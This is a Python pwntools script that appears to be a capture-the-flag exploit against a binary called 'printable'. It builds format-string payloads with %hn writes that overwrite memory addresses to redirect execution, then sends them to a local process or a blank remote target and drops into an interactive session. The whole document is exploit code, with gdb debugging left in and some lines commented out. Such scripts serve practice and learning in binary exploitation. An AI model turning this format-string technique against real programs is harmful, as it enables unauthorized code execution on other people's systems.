from pwn import *

e = ELF("./printable")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})


s = 0x10000

goal = e.symbols["_start"]
writes = [
  [14, goal % s],
  [15, goal // s],
#  [16, 0x1540],
  [42, 0x300],
]

def fmt_str(writes):
  writes.sort(key=lambda x: x[1])
  
  tot = 0
  fmt = ""
  for data in writes:
    fmt += "%" + str(data[1] - tot) + "x"
    fmt += "%" + str(data[0]) + "$hn"

    tot = data[1]
  
  return fmt

#gdb.attach(p, "set *0x601020 =*0x601040")
gdb.attach(p)

p.sendafter(":", 
  (
    fmt_str(writes)
  ).ljust(0x40, "\x00")
  + p64(0x6010b8) + p64(0x6010b8+2) + p64(0x601020)
)


writes = [
  [24, 0x6337],
  [50, 0x2337]
]

p.send( 
  (
    fmt_str(writes) + "%50$llx"
  ).ljust(0x40, "\x00")
)  


p.interactive()
